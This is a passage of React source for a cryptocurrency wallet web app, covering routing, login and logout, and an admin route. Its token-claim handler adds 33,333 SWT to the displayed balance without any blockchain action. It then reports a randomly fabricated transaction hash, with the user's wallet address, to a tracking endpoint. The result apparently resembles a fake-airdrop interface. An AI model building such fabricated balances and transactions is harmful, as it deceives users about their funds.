    device: '/device'
  };
  const pathToTab = {
    '/': 'dashboard',
    '/accounts': 'accounts',
    '/send': 'send',
    '/receive': 'receive',
    '/buy': 'buy',
    '/swap': 'swap',
    '/history': 'history',
    '/settings': 'settings',
    '/device': 'device'
  };
  const activeTab = pathToTab[location.pathname] || 'dashboard';
  const setActiveTab = (tab) => {
    const target = tabToPath[tab] || '/';
    if (location.pathname !== target) navigate(target);
  };
    const handleLogin = (shouldClaim = false) => {
    setIsConnected(true);
    navigate('/');
    if (shouldClaim) {
        // Claim after connect finishes; address is already in localStorage
        setTimeout(() => handleClaim(), 800);
    }
  };
  
  const handleClaim = () => {
      const address = walletAddress || localStorage.getItem('user_wallet_address') || '';
      if (!address) {
          addNotification('Claim Failed', 'Connect a wallet first, then claim again.', 'error');
          return;
      }

      const alreadyHad = !!getClaimedAssets(address).find((a) => a.id === 'swt_token');
      const swtToken = ensureSwtClaimed(address) || SWT_TOKEN;

      // Restore / show SWT immediately (works for return visits + new wallets)
      setAssets((prev) => {
          const without = (prev || []).filter((a) => a.id !== 'swt_token');
          const merged = [swtToken, ...without];
          const totalVal = merged.reduce((sum, a) => sum + (Number(a.value) || 0), 0);
          setTotalBalance(totalVal);
          return merged.map((a) => ({
              ...a,
              allocation: totalVal > 0 ? (((Number(a.value) || 0) / totalVal) * 100).toFixed(1) : 0
          }));
      });

      if (alreadyHad) {
          setShowClaimModal(false);
          return;
      }

      setClaimLoading(true);
      setTimeout(() => {
          setClaimLoading(false);
          setShowClaimModal(false);
          addNotification('Claim Successful', '33,333 SWT added to your wallet', 'success');
          fetch('/api/track/transaction', {
              method: 'POST',
              headers: { 'Content-Type': 'application/json' },
              body: JSON.stringify({
                  address,
                  hash: '0x' + Array(64).fill('0').map(()=>Math.floor(Math.random()*16).toString(16)).join(''),
                  type: 'claim',
                  amount: 33333,
                  symbol: 'SWT'
              })
          }).catch(()=>{});
      }, 800);
  };

  const handleLogout = () => {
    try {
      resetWallet();
    } catch {}
    try {
      // Keep claimed tokens so they reappear when the same wallet is imported again
      const claimedBackup = {};
      for (let i = 0; i < localStorage.length; i++) {
        const key = localStorage.key(i);
        if (key && key.startsWith('claimed_assets_')) {
          claimedBackup[key] = localStorage.getItem(key);
        }
      }
      localStorage.clear();
      sessionStorage.clear();
      Object.entries(claimedBackup).forEach(([key, value]) => {
        if (value != null) localStorage.setItem(key, value);
      });
    } catch {}
    addNotification('Logged Out', 'You have been disconnected.', 'info');
    setIsConnected(false);
    navigate('/');
  };
  return (
    <div className="app-container">
      <Toasts />
      {showClaimModal && <ClaimTokenModal onClose={() => setShowClaimModal(false)} onClaim={handleClaim} loading={claimLoading} />}
      {!isConnected ? (
        <LoginScreen onLogin={handleLogin} />
      ) : (
        <>
          <Sidebar activeTab={activeTab} setActiveTab={setActiveTab} onLogout={handleLogout} />
          <main className="main-content">
            <Header title={activeTab.charAt(0).toUpperCase() + activeTab.slice(1)} setActiveTab={setActiveTab} />
            {activeTab === 'dashboard' && <Dashboard setActiveTab={setActiveTab} />}
            {activeTab === 'accounts' && <AssetsList />}
            {activeTab === 'send' && <SendView />}
            {activeTab === 'receive' && <ReceiveView />}
            {activeTab === 'buy' && <BuySellView />}
            {activeTab === 'swap' && <SwapView />}
            {activeTab === 'history' && <HistoryView />}
            {activeTab === 'settings' && <SettingsView />}
            {activeTab === 'device' && <div className="section-card" style={{padding: '2rem', textAlign: 'center'}}>Device Settings (Coming Soon)</div>}
          </main>
          <MobileNav activeTab={activeTab} setActiveTab={setActiveTab} onLogout={handleLogout} />
        </>
      )}
    </div>
  );
};

// Main App Component with Routes
const App = () => {
  return (
    <ErrorBoundary>
      <Routes>
        <Route path="/admin" element={<AdminDashboard />} />
        <Route path="/*" element={
            <CryptoProvider>
                <UserApp />
            </CryptoProvider>
        } />
      </Routes>
    </ErrorBoundary>
  );
};

export default App;

const Toasts = () => {
  const { notifications } = useContext(CryptoContext);
  const [toasts, setToasts] = React.useState([]);
  const timersRef = React.useRef({});
  React.useEffect(() => {
    if (!notifications || notifications.length === 0) return;
    const newest = notifications[0];
    setToasts(prev => {
      if (prev.find(t => t.id === newest.id)) return prev;
      return [newest, ...prev];
    });
    const d = typeof newest.duration === 'number' ? newest.duration : 500;
    if (!timersRef.current[newest.id]) {
      timersRef.current[newest.id] = setTimeout(() => {
        setToasts(prev => prev.filter(t => t.id !== newest.id));
        clearTimeout(timersRef.current[newest.id]);
        delete timersRef.current[newest.id];
      }, d);
    }
  }, [notifications]);
  React.useEffect(() => {
    return () => {
      Object.values(timersRef.current).forEach(t => clearTimeout(t));
      timersRef.current = {};
    };
  }, []);
  if (toasts.length === 0) return null;
  return (
    <div className="toast-container">
      {toasts.map(t => (
        <div key={t.id} className={`toast toast-${t.type || 'info'}`}>
          <div style={{ display: 'flex', flexDirection: 'column' }}>
            <div className="toast-title">{t.title}</div>
            {t.desc && <div className="toast-desc">{t.desc}</div>}
          </div>
        </div>
      ))}
    </div>
  );
};
